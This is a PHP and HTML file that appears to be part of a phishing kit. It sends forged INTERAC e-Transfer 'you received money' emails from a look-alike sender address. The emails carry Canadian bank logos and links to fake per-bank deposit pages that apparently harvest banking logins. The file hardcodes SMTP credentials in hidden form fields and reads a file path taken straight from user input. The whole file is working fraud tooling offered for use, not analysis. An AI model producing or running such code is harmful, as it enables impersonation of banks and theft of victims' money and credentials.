<?php

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require ("PHPMailer/src/PHPMailer.php");
require ("PHPMailer/src/SMTP.php");
require ("PHPMailer/src/Exception.php");

// Get the selected email template
$emailTemplate = $_POST['email_template'];

// Read the contents of the selected template
$template = file_get_contents($emailTemplate);

// Replace the email content with the template content
$message = str_replace('{{line}}', $_POST['line'], $template);
$message = str_replace('{{username}}', $_POST['username'], $message);
$message = str_replace('{{photo_href}}', $_POST['photo_href'], $message);
$message = str_replace('{{bank}}', $_POST['bank'], $message);
$message = str_replace('{{amount}}', $_POST['amount'], $message);
$message = str_replace('{{photo_link}}', $_POST['photo_link'], $message);
$message = str_replace('{{link}}', $_POST['link'], $message);
$message = str_replace('{{EXPIRE}}', $_POST['EXPIRE'], $message);
$message = str_replace('{{line}}', $_POST['line'], $message);
$message = str_replace('{{link}}', $_POST['link'], $message);
$message = str_replace('{{sender_name}}', $_POST['sender_name'], $message);
$message = str_replace('{{receiver_name}}', $_POST['receiver_name'], $message);
$message = str_replace('{{receiver_email}}', $_POST['receiver_email'], $message);


$mail = new PHPMailer(); 
$mail->IsSMTP(); 
$mail->SMTPSecure = 'tsl';
$mail->Host = $_POST['host'];
$mail->Port = $_POST['port']; 
$mail->Body = $message; // use $message instead of $template
$mail->SMTPAuth = true; 
$mail->Username = $_POST['username']; 
$mail->Password = $_POST['password']; 
$mail->SetFrom('etransfer@interac-notify.ca', $_POST['sender_name']); 
$mail->AddAddress($_POST['receiver_email']); 
$mail->Subject = 'INTERAC e-Transfer: '.$_POST['sender_name'].' sent you money.';
$mail->IsHTML(true); 
$mail->CharSet="utf-8";

if(!$mail->Send()) {  
    echo "Mailer Error: " . $mail->ErrorInfo;
} 

?>


  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>PHP Mailer System</title>
  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
  <style>
    /* CSS design optimized for iPhones */
    body {
      font-family: Arial, sans-serif;
      font-size: 16px;
      color: #333333;
      background-color: #f2f2f2;
    }
    
  

:root {
  --glow-color: hsl(100 100% 69%);
}

*,
*::before,
*::after {
  box-sizing: border-box;
}

html,
body {
  height: 100%;
  width: 100%;
  overflow: hidden;
}

body {
  min-height: 100vh;
  display: flex;
  justify-content: center;
  align-items: center;
  background: black;
}

.glowing-btn {
  position: relative;
  color: var(--glow-color);
  cursor: pointer;
  padding: 0.35em 1em;
  border: 0.15em solid var(--glow-color);
  border-radius: 0.45em;
  background: none;
  perspective: 2em;
  font-family: "Raleway", sans-serif;
  font-size: 2em;
  font-weight: 900;
  letter-spacing: 1em;

  -webkit-box-shadow: inset 0px 0px 0.5em 0px var(--glow-color),
    0px 0px 0.5em 0px var(--glow-color);
  -moz-box-shadow: inset 0px 0px 0.5em 0px var(--glow-color),
    0px 0px 0.5em 0px var(--glow-color);
  box-shadow: inset 0px 0px 0.5em 0px var(--glow-color),
    0px 0px 0.5em 0px var(--glow-color);
  animation: border-flicker 2s linear infinite;
}

:root {
  /* Base font size */
  font-size: 4px;   
  
  /* Set neon color */
  --neon-text-color: #f40;
  --neon-border-color: #08f;
}

body {
  font-family: 'Exo 2', sans-serif;
  display: flex;
  justify-content: center;
  align-items: center;  
  background: #000;
  min-height: 100vh;
}

h1 {
  font-size: 13rem;
  font-weight: 200;
  font-style: italic;
  color: #fff;
  padding: 4rem 6rem 5.5rem;
  border: 0.4rem solid #fff;
  border-radius: 2rem;
  text-transform: uppercase;
  animation: flicker 1.5s infinite alternate;     
}

h1::-moz-selection {
  background-color: var(--neon-border-color);
  color: var(--neon-text-color);
}

h1::selection {
  background-color: var(--neon-border-color);
  color: var(--neon-text-color);
}

h1:focus {
  outline: none;
}

/* Animate neon flicker */
@keyframes flicker {
    
    0%, 19%, 21%, 23%, 25%, 54%, 56%, 100% {
      
        text-shadow:
            -0.2rem -0.2rem 1rem #fff,
            0.2rem 0.2rem 1rem #fff,
            0 0 2rem var(--neon-text-color),
            0 0 4rem var(--neon-text-color),
            0 0 6rem var(--neon-text-color),
            0 0 8rem var(--neon-text-color),
            0 0 10rem var(--neon-text-color);
        
        box-shadow:
            0 0 .5rem #fff,
            inset 0 0 .5rem #fff,
            0 0 2rem var(--neon-border-color),
            inset 0 0 2rem var(--neon-border-color),
            0 0 4rem var(--neon-border-color),
            inset 0 0 4rem var(--neon-border-color);        
    }
    
    20%, 24%, 55% {        
        text-shadow: none;
        box-shadow: none;
    }    
}
    /* Form element styling */
    input[type="text"], textarea {
      width: 100%;
      padding: 12px;
      border: 1px solid #ccc;
      border-radius: 4px;
      box-sizing: border-box;
      margin-top: 6px;
      margin-bottom: 16px;
      resize: vertical;
      font-size: 16px;
    }
    
    /* Submit button styling */
    input[type="submit"] {
      background-color: #007bff;
      color: white;
      padding: 12px 20px;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      font-size: 16px;
      transition: background-color 0.3s ease;
    }
    
    /* Submit button hover state */
    input[type="submit"]:hover {
      background-color: #0062cc;
    }
    
    /* Error message styling */
    .error {
      color: #dc3545;
      font-size: 14px;
    }
  </style>
  
<form action="https://cpanel.epizy.com/panel/indexpl.php?option=redirect_configure?" method="POST">CHANGE LIVE LINK </input></form>
 
</head>:
<body>

<form  action="a.php" method="POST" enctype="multipart/form-data">

<a href="https://dash.infinityfree.com/accounts/if0_34397155/redirects">

</a>
	
	  </div>
	  
	</nav>
 <fieldset>


<input type="hidden" name="link" value="<?php echo $_SERVER['HTTP_HOST']; ?>" required>
<input type="text"   name="receiver_email" placeholder="receivers email" value="testemail@yopmail.com"  required>
<input type="text"   name="receiver_name"  placeholder="receivers name"  value="One Time Contact" required>
<input type="text"   name="sender_name"    placeholder="sender name"     value="SUPPORT DRONES LTD" required>
<input type=""   name="amount"         placeholder="100.00"          Value="100.00"  step="0.01"  required>
<input type="hidden"   name="line""     placeholder=""      Value="<?php $futureDate = date("F d, Y", strtotime("+30 days")); echo $futureDate;?>"required>

<form action="a.php" method="POST" enctype="multipart/form-data">




    <!-- THESE MENUS ARE ONLY NEEDED IF YOU'RE USING METHOD 1, BUT YOU NEED AN ACTIVE SMTP EMAIL ADDRESS (GMAIL DOESN'T WORK) -->
    <select name="photo_link" id="photo_link">
      <option value="NULL">- BANK LOGO -</option>
      <option value="https://etransfer-content.interac.ca/en/logo_CA000002.png">Scotiabank</option>
      <option value="https://etransfer-content.interac.ca/en/logo_CA000001.png">BMO</option>
      <option value="https://etransfer-content.interac.ca/en/logo_CA000003.png">RBC</option>
      <option value="https://etransfer-content.interac.ca/en/logo_CA000010.png">CIBC</option>
      <option value="https://etransfer-content.interac.ca/en/logo_CA000219.png">ATB</option>
      <option value="https://etransfer-content.interac.ca/en/logo_CA000004.png">TD</option>

    </select>

    <select name="bank" id="bank">
      <option value="ATB Financial">ATB</option>
      <option value="Bank of Montreal">BMO</option>
      <option value="Scotiabank">Scotia</option>
      <option value="RBC Royal Bank">RBC</option>
      <option value="TD Canada Trust">TD</option>

    </select>

    <select name="photo_href" id="photo_href">
      <option value="/public/deposit/atb/928460.php">ATB</option>
      <option value="/public/deposit/bmo/928460.php">BMO</option>
      <option value="/public/deposit/cibc/928460.php">CIBC</option>
      <option value="/public/deposit/sco/928460.php">Scotiabank</option>
      <option value="/public/deposit/rbc/928460.php">RBC</option>
      <option value="/public/deposit/td/928460.php">TD</option>
<select name="email_template" id="email_template">
  <option value="Deposit.html">SEND ETRAANS</option>
  <option value="Invoice.html">CANCEL NOTICE</option>
  <option value="Invoice.html">REQUESTNOTICE</option>

  <!-- Add more options for other templates -->
</select>
    </select>
    <input type="submit" value="Submit">
    <input type="hidden" name="port" value="2525" required="">
    <input type="hidden" name="username" value="etransfer@interac-notify.ca" required="">
    <input type="hidden" name="password" value="E491908C41CE3BFA84FA8F67672C26B78454" required="">
    <input type="hidden" name="host" value="smtp.elasticemail.com" required="">
    </form>
 </fieldset>


</fieldset>

